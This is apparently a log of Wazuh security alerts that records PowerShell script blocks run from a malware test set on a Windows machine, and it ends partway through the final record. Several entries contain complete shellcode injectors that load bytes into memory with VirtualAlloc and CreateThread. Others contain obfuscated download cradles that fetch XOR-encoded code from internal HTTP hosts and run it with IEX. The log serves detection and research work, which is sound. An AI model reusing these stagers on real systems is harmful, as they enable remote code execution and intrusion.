{"timestamp":"2026-07-06T02:21:35.488+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":187,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304495.3946945","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:55.9559595Z","eventRecordID":"145765","processID":"868","threadID":"8364","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xd5,0x98,0xa1,0x65,0x68,0x02,0x00,0x99,0x26,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: a650b3ab-4205-4f17-a32c-9546067dc78a\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\374.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xd5,0x98,0xa1,0x65,0x68,0x02,0x00,0x99,0x26,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"a650b3ab-4205-4f17-a32c-9546067dc78a","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\374.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:36.830+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":22,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304496.3957888","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:56.6596522Z","eventRecordID":"145769","processID":"5328","threadID":"8684","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$wc=NEW-ObjEct SysTEM.Net.WEbCLIEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeAdErS.ADD('User-Agent',$u);$wC.ProXy = [SYsTEM.NET.WEBREQuesT]::DEFAUltWEbProxY;$wC.PROXY.CREdenTiaLS = [SYSTem.NeT.CreDEntIALCAcHE]::DEfaULTNeTWorkCREdEnTialS;$K='e8f9578e2966fb2fa1ed5a0b15a4531c';$i=0;[cHar[]]$B=([ChAr[]]($wc.DownLOAdSTrinG(\"http://192.168.8.103:8080/index.asp\")))|%{$_-bXOR$K[$I++%$K.LEnGtH]};IEX ($b-joIn'')\r\n\r\nScriptBlock ID: dc48828c-5c9e-4575-83a9-0ab31efdf269\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3761.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$wc=NEW-ObjEct SysTEM.Net.WEbCLIEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeAdErS.ADD('User-Agent',$u);$wC.ProXy = [SYsTEM.NET.WEBREQuesT]::DEFAUltWEbProxY;$wC.PROXY.CREdenTiaLS = [SYSTem.NeT.CreDEntIALCAcHE]::DEfaULTNeTWorkCREdEnTialS;$K='e8f9578e2966fb2fa1ed5a0b15a4531c';$i=0;[cHar[]]$B=([ChAr[]]($wc.DownLOAdSTrinG(\\\"http://192.168.8.103:8080/index.asp\\\")))|%{$_-bXOR$K[$I++%$K.LEnGtH]};IEX ($b-joIn'')","scriptBlockId":"dc48828c-5c9e-4575-83a9-0ab31efdf269","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3761.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:36.974+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":188,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304496.3961682","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:57.4424039Z","eventRecordID":"145773","processID":"5416","threadID":"8256","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$W9n = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $W9n -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xdf,0xbf,0x22,0xb4,0xcc,0x09,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x31,0x7d,0x18,0x83,0xc5,0x04,0x03,0x7d,0x36,0x56,0x39,0xf5,0xde,0x14,0xc2,0x06,0x1e,0x79,0x4a,0xe3,0x2f,0xb9,0x28,0x67,0x1f,0x09,0x3a,0x25,0x93,0xe2,0x6e,0xde,0x20,0x86,0xa6,0xd1,0x81,0x2d,0x91,0xdc,0x12,0x1d,0xe1,0x7f,0x90,0x5c,0x36,0xa0,0xa9,0xae,0x4b,0xa1,0xee,0xd3,0xa6,0xf3,0xa7,0x98,0x15,0xe4,0xcc,0xd5,0xa5,0x8f,0x9e,0xf8,0xad,0x6c,0x56,0xfa,0x9c,0x22,0xed,0xa5,0x3e,0xc4,0x22,0xde,0x76,0xde,0x27,0xdb,0xc1,0x55,0x93,0x97,0xd3,0xbf,0xea,0x58,0x7f,0xfe,0xc3,0xaa,0x81,0xc6,0xe3,0x54,0xf4,0x3e,0x10,0xe8,0x0f,0x85,0x6b,0x36,0x85,0x1e,0xcb,0xbd,0x3d,0xfb,0xea,0x12,0xdb,0x88,0xe0,0xdf,0xaf,0xd7,0xe4,0xde,0x7c,0x6c,0x10,0x6a,0x83,0xa3,0x91,0x28,0xa0,0x67,0xfa,0xeb,0xc9,0x3e,0xa6,0x5a,0xf5,0x21,0x09,0x02,0x53,0x29,0xa7,0x57,0xee,0x70,0xaf,0x94,0xc3,0x8a,0x2f,0xb3,0x54,0xf8,0x1d,0x1c,0xcf,0x96,0x2d,0xd5,0xc9,0x61,0x52,0xcc,0xae,0xfe,0xad,0xef,0xce,0xd7,0x69,0xbb,0x9e,0x4f,0x58,0xc4,0x74,0x90,0x65,0x11,0xe0,0x95,0xf1,0x5a,0x5d,0xb9,0x00,0x33,0x9c,0xc2,0x13,0x9f,0x29,0x24,0x43,0x4f,0x7a,0xf9,0x23,0x3f,0x3a,0xa9,0xcb,0x55,0xb5,0x96,0xeb,0x55,0x1f,0xbf,0x81,0xb9,0xf6,0x97,0x3d,0x23,0x53,0x63,0xdc,0xac,0x49,0x09,0xde,0x27,0x7e,0xed,0x90,0xcf,0x0b,0xfd,0x44,0x20,0x46,0x5f,0xc2,0x3f,0x7c,0xca,0xea,0xd5,0x7b,0x5d,0xbd,0x41,0x86,0xb8,0x89,0xcd,0x79,0xef,0x82,0xc4,0xef,0x50,0xfc,0x28,0xe0,0x50,0xfc,0x7e,0x6a,0x51,0x94,0x26,0xce,0x02,0x81,0x28,0xdb,0x36,0x1a,0xbd,0xe4,0x6e,0xcf,0x16,0x8d,0x8c,0x36,0x50,0x12,0x6e,0x1d,0x60,0x6e,0xb9,0x5b,0x16,0x9e,0x79;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$RiQz=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($RiQz.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$RiQz,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 1dbb2c26-18a0-4883-860a-511a25b34616\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3765.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$W9n = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $W9n -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xdf,0xbf,0x22,0xb4,0xcc,0x09,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x31,0x7d,0x18,0x83,0xc5,0x04,0x03,0x7d,0x36,0x56,0x39,0xf5,0xde,0x14,0xc2,0x06,0x1e,0x79,0x4a,0xe3,0x2f,0xb9,0x28,0x67,0x1f,0x09,0x3a,0x25,0x93,0xe2,0x6e,0xde,0x20,0x86,0xa6,0xd1,0x81,0x2d,0x91,0xdc,0x12,0x1d,0xe1,0x7f,0x90,0x5c,0x36,0xa0,0xa9,0xae,0x4b,0xa1,0xee,0xd3,0xa6,0xf3,0xa7,0x98,0x15,0xe4,0xcc,0xd5,0xa5,0x8f,0x9e,0xf8,0xad,0x6c,0x56,0xfa,0x9c,0x22,0xed,0xa5,0x3e,0xc4,0x22,0xde,0x76,0xde,0x27,0xdb,0xc1,0x55,0x93,0x97,0xd3,0xbf,0xea,0x58,0x7f,0xfe,0xc3,0xaa,0x81,0xc6,0xe3,0x54,0xf4,0x3e,0x10,0xe8,0x0f,0x85,0x6b,0x36,0x85,0x1e,0xcb,0xbd,0x3d,0xfb,0xea,0x12,0xdb,0x88,0xe0,0xdf,0xaf,0xd7,0xe4,0xde,0x7c,0x6c,0x10,0x6a,0x83,0xa3,0x91,0x28,0xa0,0x67,0xfa,0xeb,0xc9,0x3e,0xa6,0x5a,0xf5,0x21,0x09,0x02,0x53,0x29,0xa7,0x57,0xee,0x70,0xaf,0x94,0xc3,0x8a,0x2f,0xb3,0x54,0xf8,0x1d,0x1c,0xcf,0x96,0x2d,0xd5,0xc9,0x61,0x52,0xcc,0xae,0xfe,0xad,0xef,0xce,0xd7,0x69,0xbb,0x9e,0x4f,0x58,0xc4,0x74,0x90,0x65,0x11,0xe0,0x95,0xf1,0x5a,0x5d,0xb9,0x00,0x33,0x9c,0xc2,0x13,0x9f,0x29,0x24,0x43,0x4f,0x7a,0xf9,0x23,0x3f,0x3a,0xa9,0xcb,0x55,0xb5,0x96,0xeb,0x55,0x1f,0xbf,0x81,0xb9,0xf6,0x97,0x3d,0x23,0x53,0x63,0xdc,0xac,0x49,0x09,0xde,0x27,0x7e,0xed,0x90,0xcf,0x0b,0xfd,0x44,0x20,0x46,0x5f,0xc2,0x3f,0x7c,0xca,0xea,0xd5,0x7b,0x5d,0xbd,0x41,0x86,0xb8,0x89,0xcd,0x79,0xef,0x82,0xc4,0xef,0x50,0xfc,0x28,0xe0,0x50,0xfc,0x7e,0x6a,0x51,0x94,0x26,0xce,0x02,0x81,0x28,0xdb,0x36,0x1a,0xbd,0xe4,0x6e,0xcf,0x16,0x8d,0x8c,0x36,0x50,0x12,0x6e,0x1d,0x60,0x6e,0xb9,0x5b,0x16,0x9e,0x79;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$RiQz=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($RiQz.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$RiQz,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"1dbb2c26-18a0-4883-860a-511a25b34616","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3765.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:37.860+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":23,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304497.3973043","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:58.2625211Z","eventRecordID":"145777","processID":"3248","threadID":"632","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$WC=NEW-ObJeCT SysTeM.NeT.WEbCLieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeaDERs.AdD('User-Agent',$u);$wC.PRoXY = [SYstEm.Net.WebReqUeST]::DEFAuLtWEBProXY;$wc.PRoXY.CReDEntIalS = [SYsteM.Net.CReDEntiALCAChE]::DEFAuLtNeTwORkCRedeNtIaLs;$K='c51ce410c124a10e0db5e4b97fc2af39';$i=0;[CHaR[]]$b=([chAR[]]($wC.DownLOaDSTRinG(\"http://192.168.8.56:2222/index.asp\")))|%{$_-BXoR$k[$i++%$k.LENgTh]};IEX ($B-JoIn'')\r\n\r\nScriptBlock ID: 10f987bd-84ff-408b-b759-d8c1e68f59a8\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3777.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$WC=NEW-ObJeCT SysTeM.NeT.WEbCLieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeaDERs.AdD('User-Agent',$u);$wC.PRoXY = [SYstEm.Net.WebReqUeST]::DEFAuLtWEBProXY;$wc.PRoXY.CReDEntIalS = [SYsteM.Net.CReDEntiALCAChE]::DEFAuLtNeTwORkCRedeNtIaLs;$K='c51ce410c124a10e0db5e4b97fc2af39';$i=0;[CHaR[]]$b=([chAR[]]($wC.DownLOaDSTRinG(\\\"http://192.168.8.56:2222/index.asp\\\")))|%{$_-BXoR$k[$i++%$k.LENgTh]};IEX ($B-JoIn'')","scriptBlockId":"10f987bd-84ff-408b-b759-d8c1e68f59a8","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3777.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:39.312+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":189,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304499.3976831","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:59.1358007Z","eventRecordID":"145781","processID":"6732","threadID":"7248","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$fVQ = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $fVQ -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xcc,0xbe,0x86,0x4b,0x04,0xbf,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x31,0x70,0x18,0x83,0xc0,0x04,0x03,0x70,0x92,0xa9,0xf1,0x43,0x72,0xaf,0xfa,0xbb,0x82,0xd0,0x73,0x5e,0xb3,0xd0,0xe0,0x2a,0xe3,0xe0,0x63,0x7e,0x0f,0x8a,0x26,0x6b,0x84,0xfe,0xee,0x9c,0x2d,0xb4,0xc8,0x93,0xae,0xe5,0x29,0xb5,0x2c,0xf4,0x7d,0x15,0x0d,0x37,0x70,0x54,0x4a,0x2a,0x79,0x04,0x03,0x20,0x2c,0xb9,0x20,0x7c,0xed,0x32,0x7a,0x90,0x75,0xa6,0xca,0x93,0x54,0x79,0x41,0xca,0x76,0x7b,0x86,0x66,0x3f,0x63,0xcb,0x43,0x89,0x18,0x3f,0x3f,0x08,0xc9,0x0e,0xc0,0xa7,0x34,0xbf,0x33,0xb9,0x71,0x07,0xac,0xcc,0x8b,0x74,0x51,0xd7,0x4f,0x07,0x8d,0x52,0x54,0xaf,0x46,0xc4,0xb0,0x4e,0x8a,0x93,0x33,0x5c,0x67,0xd7,0x1c,0x40,0x76,0x34,0x17,0x7c,0xf3,0xbb,0xf8,0xf5,0x47,0x98,0xdc,0x5e,0x13,0x81,0x45,0x3a,0xf2,0xbe,0x96,0xe5,0xab,0x1a,0xdc,0x0b,0xbf,0x16,0xbf,0x43,0x0c,0x1b,0x40,0x93,0x1a,0x2c,0x33,0xa1,0x85,0x86,0xdb,0x89,0x4e,0x01,0x1b,0xee,0x64,0xf5,0xb3,0x11,0x87,0x06,0x9d,0xd5,0xd3,0x56,0xb5,0xfc,0x5b,0x3d,0x45,0x01,0x8e,0xa8,0x40,0x95,0x6e,0xda,0x36,0x91,0xf9,0x26,0xc9,0x48,0xa6,0xaf,0x2f,0x3a,0x06,0xe0,0xff,0xfa,0xf6,0x40,0x50,0x92,0x1c,0x4f,0x8f,0x82,0x1e,0x85,0xb8,0x28,0xf1,0x70,0x90,0xc4,0x68,0xd9,0x6a,0x75,0x74,0xf7,0x16,0xb5,0xfe,0xf4,0xe7,0x7b,0xf7,0x71,0xf4,0xeb,0xf7,0xcf,0xa6,0xbd,0x08,0xfa,0xcd,0x41,0x9d,0x01,0x44,0x16,0x09,0x08,0xb1,0x50,0x96,0xf3,0x94,0xeb,0x1f,0x66,0x57,0x83,0x5f,0x66,0x57,0x53,0x36,0xec,0x57,0x3b,0xee,0x54,0x04,0x5e,0xf1,0x40,0x38,0xf3,0x64,0x6b,0x69,0xa0,0x2f,0x03,0x97,0x9f,0x18,0x8c,0x68,0xca,0x98,0xf0,0xbe,0x32,0xef,0x18,0x03;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$pxl=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($pxl.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$pxl,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 86d25d60-ab3d-4c2b-92ae-5b939f347ed9\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3795.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$fVQ = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $fVQ -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xcc,0xbe,0x86,0x4b,0x04,0xbf,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x31,0x70,0x18,0x83,0xc0,0x04,0x03,0x70,0x92,0xa9,0xf1,0x43,0x72,0xaf,0xfa,0xbb,0x82,0xd0,0x73,0x5e,0xb3,0xd0,0xe0,0x2a,0xe3,0xe0,0x63,0x7e,0x0f,0x8a,0x26,0x6b,0x84,0xfe,0xee,0x9c,0x2d,0xb4,0xc8,0x93,0xae,0xe5,0x29,0xb5,0x2c,0xf4,0x7d,0x15,0x0d,0x37,0x70,0x54,0x4a,0x2a,0x79,0x04,0x03,0x20,0x2c,0xb9,0x20,0x7c,0xed,0x32,0x7a,0x90,0x75,0xa6,0xca,0x93,0x54,0x79,0x41,0xca,0x76,0x7b,0x86,0x66,0x3f,0x63,0xcb,0x43,0x89,0x18,0x3f,0x3f,0x08,0xc9,0x0e,0xc0,0xa7,0x34,0xbf,0x33,0xb9,0x71,0x07,0xac,0xcc,0x8b,0x74,0x51,0xd7,0x4f,0x07,0x8d,0x52,0x54,0xaf,0x46,0xc4,0xb0,0x4e,0x8a,0x93,0x33,0x5c,0x67,0xd7,0x1c,0x40,0x76,0x34,0x17,0x7c,0xf3,0xbb,0xf8,0xf5,0x47,0x98,0xdc,0x5e,0x13,0x81,0x45,0x3a,0xf2,0xbe,0x96,0xe5,0xab,0x1a,0xdc,0x0b,0xbf,0x16,0xbf,0x43,0x0c,0x1b,0x40,0x93,0x1a,0x2c,0x33,0xa1,0x85,0x86,0xdb,0x89,0x4e,0x01,0x1b,0xee,0x64,0xf5,0xb3,0x11,0x87,0x06,0x9d,0xd5,0xd3